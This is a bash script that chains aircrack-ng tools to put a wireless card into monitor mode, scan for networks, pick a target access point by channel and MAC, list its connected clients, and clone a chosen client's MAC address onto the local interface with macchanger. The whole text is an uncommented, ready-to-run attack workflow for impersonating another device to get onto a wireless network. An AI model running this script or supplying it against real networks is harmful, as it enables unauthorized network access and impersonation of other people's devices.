#!/bin/bash
sudo airmon-ng start wlan0
sleep 3

sudo airmon-ng check kill
sleep 3

iwconfig
sleep 3

sudo timeout 5s aireplay-ng --test wlan0

sudo timeout 15s airodump-ng wlan0

read -p "Enter target channel: " channel
read -p "Enter target MAC address: " mac

sleep 2

sudo timeout 10s airodump-ng -c "$channel" --bssid "$mac" -a wlan0


read -p "Enter client MAC address: " user_mac
sleep 2
sudo systemctl stop NetworkManager
sudo ifconfig wlan0 down
sudo airmon-ng stop wlan0

sleep 2
sudo macchanger -m "$user_mac" wlan0
sleep 2

sudo ifconfig wlan0 up
sleep 2
sudo systemctl start NetworkManager
sleep 1
iwconfig